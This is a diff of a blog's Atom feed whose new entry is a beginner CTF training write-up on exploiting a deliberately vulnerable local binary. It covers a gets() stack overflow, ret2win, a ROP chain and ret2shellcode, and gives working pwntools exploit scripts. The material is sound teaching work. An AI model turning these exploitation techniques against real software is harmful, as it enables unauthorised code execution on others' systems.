@@ -1,4 +1,204 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-04-30T12:08:16+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">TOURPRAN’s HOME</title><subtitle>This is my blog for Binary Exploitation and Reverse Engineering.</subtitle><author><name>tourpran</name></author><entry><title type="html">SQL Injection</title><link href="http://localhost:4000/blogs/2021/03/27/sqlinjection.html" rel="alternate" type="text/html" title="SQL Injection" /><published>2021-03-27T00:00:00+05:30</published><updated>2021-03-27T00:00:00+05:30</updated><id>http://localhost:4000/blogs/2021/03/27/sqlinjection</id><content type="html" xml:base="http://localhost:4000/blogs/2021/03/27/sqlinjection.html">&lt;h3 id=&quot;what-is-a-database&quot;&gt;What is a Database:&lt;/h3&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-05-10T10:08:40+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">TOURPRAN’s HOME</title><subtitle>This is my blog for Binary Exploitation and Reverse Engineering.</subtitle><author><name>tourpran</name></author><entry><title type="html">Return to Shellcode</title><link href="http://localhost:4000/pwn-training/2021/05/09/simple-ret2shellcode-training1.html" rel="alternate" type="text/html" title="Return to Shellcode" /><published>2021-05-09T00:00:00+05:30</published><updated>2021-05-09T00:00:00+05:30</updated><id>http://localhost:4000/pwn-training/2021/05/09/simple-ret2shellcode-training1</id><content type="html" xml:base="http://localhost:4000/pwn-training/2021/05/09/simple-ret2shellcode-training1.html">&lt;h3 id=&quot;introduction&quot;&gt;Introduction:&lt;/h3&gt;
+
+&lt;p&gt;This is an initiative taken by team members of ARESx. In this series of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwn-training&lt;/code&gt; we will be looking into various types of attacks performed on binaries. This in the first part of the series. We will start of slow with a simple return to shellcode challenge. Most of the challenge binary’s code will also be provided.&lt;/p&gt;
+
+&lt;h3 id=&quot;challenge&quot;&gt;Challenge:&lt;/h3&gt;
+
+&lt;p&gt;Here we are given a binary and the source for the binary.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/assets/images/pwntraining1/ret2shellcode&quot;&gt;vuln binary&lt;/a&gt; and 
+&lt;a href=&quot;/assets/images/pwntraining1/ret2shellcode.c&quot;&gt;vuln c code&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution:&lt;/h3&gt;
+
+&lt;h4 id=&quot;mitigations&quot;&gt;Mitigations:&lt;/h4&gt;
+
+&lt;p&gt;Before goinging into the exploitation its better to check what mitigations are enabled for a bianry. Mitigations are protections that were included to avoid certain attacks. For example.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;checksec &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; ./ret2shellcode
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining1/pwntrain1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If you don’t have checksec installed then&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;checksec
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;RELRO:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Partial RELRO - in attackers point of view, does nothing but leaves the got writeable.&lt;/li&gt;
+  &lt;li&gt;Full RELRO    - makes the GOT read-only therefore mitigating the “got-overwrite” attack. (got-overwrite coming soon ;) )&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;CANARY:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;its a set of characters stored on the stack to make sure no buffer overflows takes place. (we can bypass this later)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;No eXecute:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;NX Enabled - this makes sure that the code on the stack is not excecuted.(not that simple but lets go with this for now)&lt;/li&gt;
+  &lt;li&gt;NX Disabled - yea you guessed it. the code on the stack can be excecuted.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;PIE:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;position independent excecutable: will randomise the address of the code and PLT.&lt;/li&gt;
+  &lt;li&gt;point to note : the libc address will always be different cause they are PIC (Position Independent Code). even they dont know where they are loded lmao.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;RWX:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Read, write and execute : It’ll tell us if the binary has segments that we can write and excecute.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;code-walkthrough&quot;&gt;Code walkthrough:&lt;/h4&gt;
+
+&lt;p&gt;IF you are a curious assembly code lover make sure to head over to the gdb and dig deep. Here I’ll go through the c code since its a basic writeup.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining1/pwntrain2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Just ignore the ignore_me() function its for standard buffering and stuff. There are 2 functions called win and main. looking at main we see there is a buf variable with size 0x60 and a puts call. There is also a printf that will leak the address of the buf variable [intresting].&lt;/p&gt;
+
+&lt;p&gt;There is another function called gets(). we all at this point know its a dangerous function. lets see why.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;man gets
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining1/pwntrain3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;seems like gets will take input as long as there is a newline character which means we can get past the buf variable and mess things in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stack&lt;/code&gt;. So this stack is just a memory region where all the static allocations happen. lets open this in gdb and see what is happening.&lt;/p&gt;
+
+&lt;p&gt;I have a different version / flavour of gdb called pwndbg. &lt;a href=&quot;https://github.com/pwndbg/pwndbg&quot;&gt;link to download&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;disass main
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining1/pwntrain4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I know a lot of shit is happening but dont worry we only want to set a break point in the return at the end. These breakpoints are stops that’ll happen at specific address that you define when you run the binary in gdb.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;b* 0x0000000000401238
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;b for break and give the address of ret at the end of main. Now run the binary and see if you can crash it in someway. Go ahead and see if oyu can get some crash in the binary.&lt;/p&gt;
+
+&lt;p&gt;Great if you got a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;segfault&lt;/code&gt; else no worries. well do it together. run the binary in gdb with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r&lt;/code&gt; and then give 0x60 “a”s . this will fill up the buf variable. after those random “a”s maybe create a offset pattern like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;111111112222222233333333&lt;/code&gt;.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Segfault - its caused because our program is trying to read a part of memory thats invalid in this case it tried to jump to the address &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;22222222&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining1/pwntrain5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;ooof dont worry. there is a lot of information about different registers in the image but we are particularly intrested in 1 register called rsp. The rsp is the stack pointer or the register that holds infomartion about the next location to excecute. But do you see something fishy there ? Exactly we can control the return address of main. This means that we can make the binary excecute what we want.&lt;/p&gt;
+
+&lt;h4 id=&quot;aim&quot;&gt;Aim:&lt;/h4&gt;
+
+&lt;p&gt;As an attacker our aim is to make this binary give a shell for us in the server. So we looked at a win() function earlier, this will land us a nice neat shell! Tho there wont be any win() function in real life applications, its your task to somehow find ways to get a shell in the server.&lt;/p&gt;
+
+&lt;h4 id=&quot;return-to-win&quot;&gt;Return to win:&lt;/h4&gt;
+
+&lt;p&gt;now since we control the return address of main why not lets change the return address to win function?&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Win function does execve(“/bin/sh”) -&amp;gt; which means that it’ll call a system function called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve&lt;/code&gt; and excecute the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; which is a shell.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;ok lets start writing our script in python. First we will import pwntools library to make things easier. next we will connect to our binary and send/recieve messages.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ret2shellcode&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00000000004011a5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Here in the sendline command I am giving “a” * 0x60 to fill the buf variable and extra “a” * 8 to fill the rbp (base pointer) and then the address of win function. wait what is that p64() ? -&amp;gt; p64() function will make your address into little endian format.&lt;/p&gt;
+
+&lt;p&gt;Run this script and lets see what we get. SHOOT you get something called EOF (End Of File) ?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining1/pwntrain6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;You can attach a gdb with your script and see where your script will crash / how it runs. But we are already given the c code and we know that there was some addictional checks done to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining1/pwntrain7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So we have to somehow make the arg1 = 0xdeadbeef and arg2 = 0xcafebabe. This is where return oriented programming comes into picture.&lt;/p&gt;
+
+&lt;h5 id=&quot;return-oriented-programming&quot;&gt;Return Oriented Programming:&lt;/h5&gt;
+
+&lt;p&gt;This is a type of attack where we use static code or code thats been used to make this binary. we will combine one or many such code snippets to form a chain that’ll do something valuable to us.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Since win is a function with arg1 and arg2 as parameters. We have to know that the parameters to a function is given through registers and especially by RDI, RSI, RDX&lt;/li&gt;
+  &lt;li&gt;so we can set RDI = 0xdeadbeef and RSI = 0xcafebabe. then call win function.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;exploit-ret2win&quot;&gt;Exploit [ret2win]:&lt;/h4&gt;
+
+&lt;p&gt;Firstly we can get all the gadgets in the binary with &lt;a href=&quot;https://github.com/JonathanSalwan/ROPgadget&quot;&gt;ROPgadget&lt;/a&gt;. Then lets take out the ones that we want.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 ROPgadget.py &lt;span class=&quot;nt&quot;&gt;--binary&lt;/span&gt; ../Documents/pwn-train/pwn1/ret2shellcode
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining1/pwntrain8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;add the gadgets in the list and then give the values then call win function. HOORAY !!!&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ret2shellcode&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;pause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x000000000040129b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0000000000401299&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xcafebabe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00000000004011a5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining1/pwntrain9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;exploit-simpler-version&quot;&gt;Exploit [simpler version]:&lt;/h4&gt;
+
+&lt;p&gt;I know you went through all the struggle to set the arguments right. But if you can control the return address and jump literally anywhere, then why not just jump directly on the execve function.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ret2shellcode&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00000000004011d1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# address to execve
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;return-2-shellcode&quot;&gt;return 2 shellcode:&lt;/h4&gt;
+
+&lt;p&gt;This is the third and final way that well discuss in this blog. Do you remember the leak at the begining ? Yes we will use the leak to get a shell. this time ignore the win() function. without the help of helper function get a shell yourself :D .&lt;/p&gt;
+
+&lt;p&gt;Remember at the begining I said this binary is NX disabled. So we can basically store the commands that we want to excecute in buf variable and then jump back to the buf variable thereby excecuting whatever we want.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;first step is to store the leak in a variable. We will use recvline function here.&lt;/li&gt;
+  &lt;li&gt;write all the commands that you want to excecute (pwntools has inbuilt functionalities :D )&lt;/li&gt;
+  &lt;li&gt;fill the gap between the return and the shellcode (shellcode -&amp;gt; all the commands to be excecuted )&lt;/li&gt;
+  &lt;li&gt;jump back to buf variable.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;REMOTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'localhost'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# start the process.
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./ret2shellcode'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;buf_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# recvlines and then get the leak
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcraft&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;linux&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# generates a shellcode compatible with linux systems
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;104&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# spans the gap between buf variable and return 
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# address of the buf variable
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# send the payload
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# doesnt close the shell and keeps it open for us.
